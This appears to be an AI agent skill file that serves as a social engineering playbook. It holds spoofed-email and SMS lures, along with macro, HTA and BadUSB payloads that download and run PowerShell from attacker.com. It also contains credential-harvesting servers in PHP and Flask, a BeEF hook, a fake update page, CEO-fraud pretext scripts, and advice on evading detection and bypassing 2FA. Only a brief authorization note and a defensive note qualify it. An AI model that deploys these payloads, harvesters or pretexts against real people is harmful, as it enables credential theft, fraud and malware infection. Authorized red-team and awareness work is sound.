---
name: performing-social-engineering
description: Conduct phishing campaigns, credential harvesting, pretexting, and social engineering attacks using tools like Gophish, SET, and custom techniques. Use when performing social engineering assessments or red team engagements.
---

# Performing Social Engineering

## When to Use

- Phishing campaign execution
- Credential harvesting operations
- Social engineering assessments
- Red team engagements
- Security awareness testing

## Phishing Infrastructure

### Gophish (Phishing Framework)

```bash
# Install
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# Access web interface
https://localhost:3333
# Default: admin:gophish
```

**Gophish Campaign Setup:**
1. **Email Templates** - Create convincing phishing emails
2. **Landing Pages** - Clone legitimate sites for credential harvesting
3. **Sending Profiles** - Configure SMTP server
4. **Groups** - Import target user lists
5. **Campaign** - Combine all elements and launch

### SET (Social Engineering Toolkit)

```bash
# Launch SET
setoolkit

# Common modules:
# 1) Social-Engineering Attacks
#    1) Spear-Phishing Attack Vectors
#    2) Website Attack Vectors
#    3) Credential Harvester Attack Method
```

**Credential Harvester:**
```bash
# SET Menu:
# 1 -> 2 -> 3 (Credential Harvester)
# Choose site template or custom URL
# Enter attacker IP
# Hosts fake login page
# Captures credentials when submitted
```

## Email Phishing

### Email Spoofing

```bash
# sendEmail (simple SMTP client)
sendEmail -f ceo@company.com \
  -t target@company.com \
  -u "Urgent: Password Reset Required" \
  -m "Click here to reset: http://evil.com/reset" \
  -s smtp.server.com:25

# swaks (SMTP testing tool)
swaks --to target@company.com \
  --from ceo@company.com \
  --header "Subject: Important Update" \
  --body "Please review: http://evil.com" \
  --server smtp.company.com
```

### Attachment-Based Phishing

**Malicious Office Macros:**
```vba
' Excel/Word VBA macro
Sub AutoOpen()
    Shell "powershell -nop -w hidden -c ""IEX((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"""
End Sub
```

**Malicious PDF:**
```bash
# Create PDF with embedded JavaScript
# Use tools like:
# - metasploit (exploit/windows/fileformat/adobe_pdf_embedded_exe)
# - PDFtk
# - malicious JavaScript injection
```

**Malicious HTA:**
```html
<!-- malicious.hta -->
<html>
<head>
<script language="VBScript">
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
window.close()
</script>
</head>
</html>
```

### Clone Legitimate Sites

```bash
# HTTrack website copier
httrack http://legitimate-site.com -O ./cloned_site/

# wget mirror
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://legitimate-site.com

# Manual with curl
curl -o index.html http://legitimate-site.com/login

# Modify form action to send credentials to attacker
<form action="http://attacker.com/harvest.php" method="POST">
```

### Credential Harvesting Server

**Simple PHP Harvester:**
```php
<?php
// harvest.php
$file = 'credentials.txt';
$username = $_POST['username'];
$password = $_POST['password'];
$data = "User: $username | Pass: $password | IP: " . $_SERVER['REMOTE_ADDR'] . " | " . date('Y-m-d H:i:s') . "\n";
file_put_contents($file, $data, FILE_APPEND);

// Redirect to real site
header('Location: https://real-site.com');
?>
```

**Python Flask Harvester:**
```python
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def harvest():
    with open('creds.txt', 'a') as f:
        f.write(f"User: {request.form['username']}, Pass: {request.form['password']}\n")
    return redirect('https://real-site.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

## Voice Phishing (Vishing)

### SpoofCard/Caller ID Spoofing

- Services to spoof caller ID
- Impersonate IT support, executives, vendors
- Social engineering over phone

**Common Pretexts:**
- IT support needing to verify credentials
- HR department verifying personal information
- Finance department confirming wire transfer
- Vendor requiring payment information update

## SMS Phishing (Smishing)

```bash
# Send SMS with link
# Use services or tools like:
# - Twilio API
# - SMS gateways
# - SIM card with AT commands

# Example pretext:
"Your package delivery failed. Track here: http://evil.com/track"
"Your account has been locked. Reset here: http://evil.com/unlock"
"You've won a prize! Claim here: http://evil.com/claim"
```

## USB Drop Attacks

### Rubber Ducky / Bad USB

**Ducky Script Example:**
```
REM Open PowerShell and download payload
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
ENTER
```

**Bash Bunny:**
```bash
# Payloads at /payloads/switch1/
# Example: exfiltrate files, run payload, etc.
```

### Physical USB Drops

**Pretexts:**
- "Company Financial Data 2024"
- "Salary Information - Confidential"
- "Employee Bonuses Q4"
- "IT Security Update - Required"

**Payload Ideas:**
- Reverse shell
- Credential stealer
- Keylogger
- Data exfiltration
- Persistence mechanisms

## QR Code Phishing

```bash
# Generate QR code pointing to phishing site
qrencode -o evil_qr.png "http://evil.com/harvest"

# Print and place in physical locations:
# - "Scan for Free WiFi"
# - "Employee Portal Access"
# - "Building Directory"
```

## Watering Hole Attacks

1. **Identify** target organization's commonly visited sites
2. **Compromise** the website (or create lookalike)
3. **Inject** malicious code (exploit or profiling)
4. **Wait** for targets to visit and get compromised

## Browser-Based Attacks

### BeEF (Browser Exploitation Framework)

```bash
# Start BeEF
./beef

# Hook browsers with:
<script src="http://attacker-ip:3000/hook.js"></script>

# Access UI
http://127.0.0.1:3000/ui/panel
# Default: beef:beef

# Commands:
# - Social Engineering (fake notifications)
# - Browser exploitation
# - Network discovery
# - Credential harvesting
```

### Fake Update Pages

```html
<!-- fake-update.html -->
<html>
<head><title>Critical Browser Update Required</title></head>
<body>
<h1>Your browser is out of date!</h1>
<p>Click here to download the latest security update.</p>
<a href="http://attacker.com/malware.exe">Download Update</a>
</body>
</html>
```

## Pretexting Scenarios

**IT Support:**
- "Hi, this is John from IT. We're doing routine password resets..."
- "We've detected suspicious activity on your account..."
- "Your VPN certificate is expiring, we need to update it..."

**Executive Impersonation:**
- "This is [CEO name], I'm in a meeting and need you to..."
- "Urgent: Wire transfer needed before end of day..."
- "I'm traveling and can't access my account, can you help me..."

**Vendor/Partner:**
- "This is accounting from [vendor]. We need to update payment information..."
- "Your invoice is past due, please update billing details..."

**Delivery/Shipping:**
- "Package delivery failed, verify address..."
- "Customs clearance required, pay fee at..."

## LinkedIn/Social Media Reconnaissance

```bash
# Gather employee information
# - Job titles
# - Organizational structure
# - Technologies used
# - Recent activities/projects

# Tools:
# - theHarvester
# - linkedin2username
# - hunter.io (email patterns)

# Use for:
# - Targeted phishing
# - Pretexting scenarios
# - Impersonation attacks
```

## Payload Delivery Methods

**Links:**
- Shortened URLs (bit.ly, tinyurl)
- Typosquatting domains
- Homograph attacks (IDN homograph)
- URL obfuscation

**Attachments:**
- Office documents with macros (.docm, .xlsm)
- PDFs with exploits/JavaScript
- Compressed files (.zip, .rar)
- ISO/IMG files
- LNK files (shortcut tricks)

**Advanced:**
- HTML smuggling
- Polyglot files
- Password-protected archives (bypass AV)
- Signed malware (stolen/fake certificates)

## Tracking and Reporting

**Email Tracking:**
```html
<!-- Invisible tracking pixel -->
<img src="http://attacker.com/track?id=USER123" width="1" height="1" style="display:none">
```

**Link Tracking:**
```bash
# Unique URL per target
http://attacker.com/click?id=USER123

# Log access in server
```

**Metrics to Track:**
- Emails sent
- Emails opened (tracking pixel)
- Links clicked
- Credentials submitted
- Attachments opened
- Time to first click/submission

## OpSec Considerations

**Infrastructure:**
- Use disposable domains
- HTTPS for credential harvesting
- Legitimate SSL certificates (Let's Encrypt)
- Categorize domains (submit to categorization services)
- CDN for hosting (CloudFlare)

**Email:**
- SPF/DKIM/DMARC alignment
- Warm up email reputation
- Similar but different domains (company.com vs company-portal.com)
- Avoid spam trigger words

**Detection Avoidance:**
- Realistic sender names and addresses
- Professional email content
- Avoid known malicious indicators
- Time-based delivery (business hours)
- Geofencing (target geography only)

## Tools Summary

- **Gophish** - Phishing campaign management
- **SET** - Social Engineering Toolkit
- **BeEF** - Browser exploitation
- **King Phisher** - Phishing campaign toolkit
- **Evilginx2** - MITM phishing proxy (bypass 2FA)
- **Modlishka** - Reverse proxy phishing
- **CredSniper** - 2FA token capture
- **ShellPhish** - Automated phishing

## Defensive Awareness

Teach users to recognize:
- Urgency/pressure tactics
- Requests for credentials
- Unusual senders
- Suspicious links/attachments
- Too-good-to-be-true offers
- Requests to bypass security

## Legal and Ethical Considerations

- **Always have written authorization**
- Define scope clearly
- Protect harvested data
- Follow ROE (Rules of Engagement)
- Report findings responsibly
- Delete data after engagement

## References

- https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology
- https://getgophish.com/
- https://github.com/trustedsec/social-engineer-toolkit
- https://www.social-engineer.org/
